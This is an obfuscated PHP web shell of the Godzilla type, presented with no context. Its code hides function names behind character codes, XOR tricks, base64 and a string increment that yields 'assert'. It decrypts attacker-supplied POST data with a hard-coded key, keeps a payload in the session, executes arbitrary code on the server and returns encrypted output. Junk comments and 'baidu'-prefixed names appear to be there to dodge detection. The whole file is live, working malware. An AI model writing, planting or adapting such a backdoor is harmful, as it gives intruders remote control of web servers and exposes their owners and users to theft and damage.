
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*fuckgovw*/(Chr("48"));
function baiduN80RGThRq(/*fuckgovuSOTmZTmf*/$baiduOHzZ5,$baidu477WMeX4IN){
    for($baiduB2y0BB3NQbj3Ef0=Chr("48");$baiduB2y0BB3NQbj3Ef0<strlen($baiduOHzZ5);$baiduB2y0BB3NQbj3Ef0++) {
        $baidua = $baidu477WMeX4IN[$baiduB2y0BB3NQbj3Ef0+Chr("49")&15];
        $baiduOHzZ5[$baiduB2y0BB3NQbj3Ef0] = $baiduOHzZ5[$baiduB2y0BB3NQbj3Ef0]^$baidua;
    }
    return $baiduOHzZ5;
}
$baidulNYwFsk = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_baiduN80RGThRq = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$baiduqt=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baidulNYwFsk($baidulNYwFsk("Y2c9PQ=="));
$baidu2pDvcsCaJ6E2='p'.$baidulNYwFsk($baidulNYwFsk("WVhsc2IyRms="));
$baiduGuUXbw='8df780ac'.$baidulNYwFsk("M2E2NWUxMWQ=");
$baidu3mM6cOiHJPsBf1=("!"^"@").'ss'.Chr("101").'rs';
$baidu3mM6cOiHJPsBf1++;
if (isset($_POST/*fuckgovhmBI49*/[$baiduqt])){
    $datbaidu3mM6cOiHJPsBf1=baiduN80RGThRq/*fuckgovSuTKuznPM*/($baidulNYwFsk($_POST[$baiduqt]),$baiduGuUXbw);
    if (/*fuckgovzWO4*/isset($_SESSION/*fuckgovegsNs2a3*/[$baidu2pDvcsCaJ6E2])){
        $baiduxoLkXKQ=baiduN80RGThRq($_SESSION/*fuckgovHWjbt*/[$baidu2pDvcsCaJ6E2],$baiduGuUXbw);
        if (/*fuckgovoJE*/strpos($baiduxoLkXKQ,$baidulNYwFsk/*fuckgovrWZjZW7j*/($baidulNYwFsk("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
            $baiduxoLkXKQ=baiduN80RGThRq/*fuckgovEUjoJ84DNW9BFG*/($baiduxoLkXKQ,$baiduGuUXbw);
        }
		define("baidugSMgxpl","//baiduWF\r\n".$baiduxoLkXKQ);
		$baidu3mM6cOiHJPsBf1(baidugSMgxpl);
        echo substr(/*fuckgov94PjcFcBc*/md5/*fuckgoveNWRfuBf*/($baiduqt.$baiduGuUXbw),Chr("48"),16);
        echo $base64_baiduN80RGThRq(baiduN80RGThRq(@run($datbaidu3mM6cOiHJPsBf1),$baiduGuUXbw));
        echo substr(/*fuckgovZVgRfcx20*/md5/*fuckgovVEMelJ3*/($baiduqt.$baiduGuUXbw),16);
    }else{
        if (strpos/*fuckgov7I*/($datbaidu3mM6cOiHJPsBf1,$baidulNYwFsk($baidulNYwFsk("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
            $_SESSION[$baidu2pDvcsCaJ6E2]=baiduN80RGThRq($datbaidu3mM6cOiHJPsBf1,$baiduGuUXbw);
        }
    }
}
?>
